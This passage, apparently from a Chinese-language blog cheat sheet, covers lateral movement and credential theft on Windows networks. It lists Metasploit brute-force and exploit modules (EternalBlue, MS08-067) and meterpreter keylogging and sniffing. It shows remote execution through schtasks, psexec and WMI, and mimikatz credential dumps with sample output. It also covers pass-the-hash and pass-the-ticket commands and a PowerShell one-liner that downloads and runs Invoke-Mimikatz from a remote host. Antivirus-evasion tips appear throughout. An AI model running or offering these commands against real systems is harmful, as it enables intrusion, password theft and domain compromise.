<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SMB版本识别：auxiliary/scanner/smb/smb_version </span><br><span class="line">MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433</span><br><span class="line">SSH版本信息：auxiliary/scanner/ssh/ssh_version</span><br><span class="line">FTP版本识别：auxiliary/scanner/ftp/ftp_version</span><br><span class="line">HTTP服务：auxiliary/scanner/http/http_header 返回相关header信息</span><br></pre></td></tr></table></figure>

<p>port：21 （FTP）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_login     //FTP登陆爆破</span><br></pre></td></tr></table></figure>

<p>其它：search FTP。FTP常见利用方式，除了直接获取文件，还要注意目录跨越漏洞，成功利用，可以直接反弹shell</p>
<p>port:22 (SSH)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>

<p>其它：search SSH</p>
<p>port:23 (telnet)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/telnet/telnet_login    //主要目标是内网中的路由器，交换机等网络设备</span><br></pre></td></tr></table></figure>

<p>port:445</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms08_067_netapi         //上古漏洞，依然有惊喜</span><br><span class="line">exploit/windows/smb/ms17_010_eternalblue    //永恒之蓝</span><br><span class="line">auxiliary/scanner/smb/smb_login             //SMB登陆爆破</span><br></pre></td></tr></table></figure>

<p>其它：search smb | Samba。linux下的CVE-2017-7494， 445 端口的远程利用</p>
<p>port:3389 (远程桌面RDP)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rdp/ms12_020_check</span><br></pre></td></tr></table></figure>

<p>5900 (VNC)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">auxiliary/scanner/vnc/vnc_login</span><br><span class="line">exploit/multi/vnc/vnc_keyboard_exec</span><br></pre></td></tr></table></figure>

<p>数据库：</p>
<p>port:1433 （Sqlserver）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure>

<p>port:3306 (Mysql)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_login</span><br></pre></td></tr></table></figure>

<p>port: 27017、27018 (Mongodb)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></table></figure>

<p>port:6379 （Redis）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/redis/redis_login</span><br><span class="line">auxiliary/scanner/redis/file_upload</span><br></pre></td></tr></table></figure>

<p>port:1521 (Oracle)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Oracle</span><br></pre></td></tr></table></figure>

<p>port:5432 (PostgreSQL)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search PostgreSQL</span><br></pre></td></tr></table></figure>

<p>use auxiliary/server/socks4a<br>proxychains设置socks4为上条设置的，即可在本地代理扫描, 目前msf已经支持 socks5 代理</p>
<h3 id="Msf端口转发portfwd"><a href="#Msf端口转发portfwd" class="headerlink" title="Msf端口转发portfwd"></a>Msf端口转发portfwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L 0.0.0.0 4443 -p 3389 -r 192.168.2.100</span><br></pre></td></tr></table></figure>

<p>将192.168.1.2.100内网转发到本地4443 port，流量大不好用</p>
<h4 id="Msf截屏-没被360拦没提示，或许有意外收获"><a href="#Msf截屏-没被360拦没提示，或许有意外收获" class="headerlink" title="Msf截屏(没被360拦没提示，或许有意外收获)"></a>Msf截屏(没被360拦没提示，或许有意外收获)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use espia</span><br><span class="line">meterpreter &gt; screengrab</span><br></pre></td></tr></table></figure>

<h4 id="Msf嗅探"><a href="#Msf嗅探" class="headerlink" title="Msf嗅探"></a>Msf嗅探</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Sniffer Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    sniffer_dump        Retrieve captured packet data to PCAP file</span><br><span class="line">    sniffer_interfaces  Enumerate all sniffable network interfaces</span><br><span class="line">    sniffer_release     Free captured packets on a specific interface instead of downloading them</span><br><span class="line">    sniffer_start       Start packet capture on a specific interface</span><br><span class="line">    sniffer_stats       View statistics of an active capture</span><br><span class="line">    sniffer_stop        Stop packet capture on a specific interface</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - &#x27;WAN Miniport (Network Monitor)&#x27; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &#x27;Intel(R) PRO/1000 MT Network Connection&#x27; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">3 - &#x27;Intel(R) PRO/1000 MT Network Connection&#x27; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">4 - &#x27;Intel(R) PRO/1000 MT Network Connection&#x27; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">5 - &#x27;Intel(R) PRO/1000 MT Network Connection&#x27; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start 5</span><br><span class="line">[*] Capture started on interface 5 (50000 packet buffer)</span><br><span class="line">meterpreter &gt; sniffer_dump 5 /tmp/1.pcap</span><br><span class="line">[*] Flushing packet capture buffer for interface 5...</span><br><span class="line">[*] Flushed 2540 packets (1450560 bytes)</span><br><span class="line">[*] Downloaded 036% (524288/1450560)...</span><br><span class="line">[*] Downloaded 072% (1048576/1450560)...</span><br><span class="line">[*] Downloaded 100% (1450560/1450560)...</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /tmp/1.pcap</span><br><span class="line">meterpreter &gt; sniffer_stop 5</span><br><span class="line">[*] Capture stopped on interface 5</span><br><span class="line">[*] There are 29 packets (2263 bytes) remaining</span><br><span class="line">[*] Download or release them using &#x27;sniffer_dump&#x27; or &#x27;sniffer_release&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>Msf键盘记录在win不会创建新进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">jamd&lt;CR&gt;</span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>

<p>Keylogger(tip:可以把管理工具，如navicat,putty,SecureCRT,PLSQL设置记住密码) ixkeylog,linux&gt;=2.63 –redrain推荐</p>
<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>at\schtasks\psexec\wmic\sc\ps</p>
<p>window 在工作组内用非 Administrator (SID!=500)其他管理员建立远程连接( wmi, ipc$ )，权限不是管理权限，可以改 LocalAccountTokenFilterPolicy = 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system </span><br><span class="line">/v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<h4 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h4><p>开启共享，开445，139 port</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:&gt;net use \\192.168.1.254\c$ &quot;pwd&quot; /user:user     //连接192.168.1.254的IPC$共享，用unc路径</span><br><span class="line">如果是域用户 D:&gt;net use \\192.168.1.254\c$ &quot;pwd&quot; /user:domain\user</span><br><span class="line">D:&gt;copy srv.exe \\192.168.1.254\c$ //复制本地srv.exe到C根目录</span><br><span class="line">D:&gt;net time \\192.168.1.254         //查时间</span><br><span class="line">D:&gt;at　\\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动srv.exe (这里360会拦截)</span><br><span class="line">D:&gt;net use \\192.168.1.254\c$ /del</span><br></pre></td></tr></table></figure>

<h4 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h4><p>这里schtasks用着很舒服:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn mytask /s ip /tr F:\Desktop.exe /sc minute /mo 1  /F 每分运行1次  普通权限即可， /s参数 远程ip 用于ipc连接后，远程主机执行 ，/F 表示有重名直接覆盖和创建或删除修改计划不再确认</span><br><span class="line">schtasks /create /tn mytask /tr F:\Desktop.exe /sc minute /mo 1 /ru system /F  管理员权限运行</span><br></pre></td></tr></table></figure>

<p>如果程序有参数用引号”C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp” schtasks /Create /TN test /SC DAILY /ST 00:09 /TR notepad.exe /RU SYSTEM 内置命令前加”cmd /c”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn mytask /tr &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy41\windows\NTDS\ntds.dit c:\ntds.dit 2&gt;&amp;1 &gt; c:\windows\temp\1.txt&quot; /sc minute /mo 1  /f /ru system /s 172.17.1.1</span><br><span class="line">C:\jboss-5.1.0.GA\bin\&gt;schtasks /create /tn mytask /s 172.17.1.1 /tr &quot;C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp&quot; /sc minute /mo 2</span><br><span class="line">SUCCESS: The scheduled task &quot;mytask&quot; has successfully been created.</span><br><span class="line"></span><br><span class="line">C:\jboss-5.1.0.GA\bin\&gt;schtasks /Query /TN mytask /s 172.17.1.1</span><br><span class="line">Folder: \</span><br><span class="line">TaskName                                 Next Run Time          Status         </span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">mytask                                   16-05-2018 07:50:00    Ready          </span><br><span class="line"></span><br><span class="line">C:\jboss-5.1.0.GA\bin\&gt;schtasks /Run /TN mytask /s 172.17.1.1</span><br><span class="line"></span><br><span class="line">Folder: \</span><br><span class="line">TaskName                                 Next Run Time          Status         </span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">mytask                                   16-05-2018 07:52:00    Ready          </span><br><span class="line"></span><br><span class="line">C:\jboss-5.1.0.GA\bin\&gt;schtasks /Delete /TN mytask /F /s 172.17.1.1</span><br><span class="line">SUCCESS: The scheduled task &quot;mytask&quot; was successfully deleted.</span><br></pre></td></tr></table></figure>

<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>psexec 不推荐用,创建服务并删除,产生日志，需要开共享</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -r sanr \\192.168.1.101 -u user -p pass cmd -r 参数为创建的服务名 可能绕过检测</span><br></pre></td></tr></table></figure>

<h4 id="wmi-135"><a href="#wmi-135" class="headerlink" title="wmi(135)"></a>wmi(135)</h4><p>wmi 如果防火墙开启无法连接，优点无日志，无落地(写入磁盘)，以下命令无回显，写入txt，type查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.101 /user:admin /password:@!123QWW</span><br><span class="line">process call create &quot;cmd.exe /c whoami&quot;</span><br></pre></td></tr></table></figure>

<h5 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h5><p>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password 如果没明文密码，pth后利用。 <a target="_blank" rel="noopener" href="http://www.91ri.org/12908.html">http://www.91ri.org/12908.html</a></p>
<h4 id="winexe"><a href="#winexe" class="headerlink" title="winexe"></a>winexe</h4><p>winexe可以从Linux上远程执行windows命令（SMB），kali自带</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./winexe --system -U &#x27;Administrator%123123&#x27; //192.168.1.101 &#x27;cmd.exe /c whoami&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="PsRemoting"><a href="#PsRemoting" class="headerlink" title="PsRemoting"></a>PsRemoting</h4><p>2012 r2起,默认端口5985,系统自带远程管理winrs winrs -r:192.168.1.101 -u:administrator -p:pwd ipconfig</p>
<h3 id="mimikatz-procdump-获得内存-hash"><a href="#mimikatz-procdump-获得内存-hash" class="headerlink" title="mimikatz + procdump 获得内存 hash"></a>mimikatz + procdump 获得内存 hash</h3><p>如果服务器是64位，要把Mimikatz进程迁移到一个64位的程序进程中，才能查看64位系统密码明文。32位任意</p>
<p>运行<code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code>(管理权限)后lsass.dmp放到mimikatz.exe同目录，运行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">C:\Windows\Temp\test\x64&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.1.1 (x64) built on May  2 2018 00:26:52</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br><span class="line">Switch to MINIDUMP : &#x27;lsass.dmp&#x27;</span><br><span class="line">mimikatz # sekurlsa::logonPasswords full</span><br><span class="line">Opening : &#x27;lsass.dmp&#x27; file for minidump...</span><br><span class="line"></span><br><span class="line">Authentication Id : 4 ; 484366552 (00000004:1cded8d8)</span><br><span class="line">Session           : RemoteInteractive from 4</span><br><span class="line">User Name         : admin</span><br><span class="line">Domain            : xx</span><br><span class="line">Logon Server      : WIN-VEG0FAB6OQS</span><br><span class="line">Logon Time        : 5/5/2018 11:49:44 AM</span><br><span class="line">SID               : S-1-5-21-970513389-3385549917-1141547890-1128</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : admin</span><br><span class="line">         * Domain   : xx</span><br><span class="line">         * NTLM     : xxxxxxxxxxxxxxxxxx</span><br><span class="line">         * SHA1     : xxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">         [00010000] CredentialKeys</span><br><span class="line">         * NTLM     : xxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">         * SHA1     : xxxxxxxxxxxxxxxxxx</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : admin</span><br><span class="line">         * Domain   : xx</span><br><span class="line">         * Password : QWEad!@w123</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : admin</span><br><span class="line">         * Domain   : xx</span><br><span class="line">         * Password : QWEad!@w123</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">Authentication Id : 0 ; 2138016 (00000000:00209fa0)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : dmadmin</span><br><span class="line">Domain            : xx</span><br><span class="line">Logon Server      : WIN-VEG0FAB6OQS</span><br><span class="line">Logon Time        : 3/7/2018 3:23:17 PM</span><br><span class="line">SID               : S-1-5-21-970513389-3385549917-1141547890-1119</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : dmadmin</span><br><span class="line">         * Domain   : xx</span><br><span class="line">         * NTLM     : xxxxxxxxxxxxx</span><br><span class="line">         * SHA1     : xxxxxxxxxxxx</span><br><span class="line">         [00010000] CredentialKeys</span><br><span class="line">         * NTLM     : xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">         * SHA1     : xxxxxxxxxxxxxxxxxx</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : dmadmin</span><br><span class="line">         * Domain   : xx</span><br><span class="line">         * Password : 1234!qw</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : dmadmin</span><br><span class="line">         * Domain   : xx.com</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure>

<p>导出当前 内存 hash，需要免杀过av等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>

<p>Windows Server 2012,部分Windows Server 2008默认无法使用mimikatz导出明文口令</p>
<p>解决方法：启用Wdigest Auth</p>
<p>cmd:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>powershell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>

<p>重启或者用户再次登录，能够导出明文口令<br><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">3gstudent自动Dump-Clear-Text-Password-after-KB2871997-installed</a></p>
<h3 id="SAM-hash"><a href="#SAM-hash" class="headerlink" title="SAM-hash"></a>SAM-hash</h3><p>管理权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM Sys.hiv</span><br><span class="line">reg save HKLM\SAM Sam.hiv</span><br></pre></td></tr></table></figure>

<p>mimikatz:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv</span><br><span class="line">mimikatz # lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv</span><br><span class="line">Domain : MINI</span><br><span class="line">SysKey : 58699cc69ada69e9d859731bec45824d</span><br><span class="line">Local SID : S-1-5-21-687613702-1072107351-1410383080</span><br><span class="line"></span><br><span class="line">SAMKey : 339c56f87f46195ddd5158c018a973de</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 22388b7da6d4e33b9ab1cdf631daff8c</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000003ee (1006)</span><br><span class="line">User : HomeGroupUser$</span><br><span class="line">  Hash NTLM: 73233a63fa3dd495142e3a362a921221</span><br></pre></td></tr></table></figure>

<h4 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h4><p>wmiexec普通权限即可<br><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 &quot;whoami&quot; //domain=TEST user=test1</span><br></pre></td></tr></table></figure>

<p>or 需要管理权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:abc /domain:test.local /ntlm:hash&quot;</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">Administrator:500:xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c:::</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; set SMBuser Administrator</span><br><span class="line">msf exploit(psexec) &gt; set SMBPass xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<p>安装了KB2871997补丁或者系统版本大于等于windows server 2012时，内存不再明文保存密码，1,改注册表后，注销再次登录，可以使用，schtasks等执行命令无法用管理员权限。2.用ptk，ptt。例外，打补丁后administrato（SID-500）依旧可以pth</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p>
<h4 id="pass-the-key"><a href="#pass-the-key" class="headerlink" title="pass the key"></a>pass the key</h4><p>需要免杀：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;  获取用户的aes key</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:a /domain:test.local /aes256:asdq379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c&quot;  注入aes key</span><br><span class="line">dir \\计算机名</span><br></pre></td></tr></table></figure>

<h4 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h4><p>不需要管理员权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:abc /domain:test.local /ntlm:hash&quot;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
<p>导入ticket：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;kerberos::ptt TGT_abc@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot;</span><br></pre></td></tr></table></figure>

<h4 id="ntds-dit"><a href="#ntds-dit" class="headerlink" title="ntds.dit"></a>ntds.dit</h4><p>vssadmin方法&gt;=win 2008<br>查询当前系统的快照</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>

<p>创建快照</p>
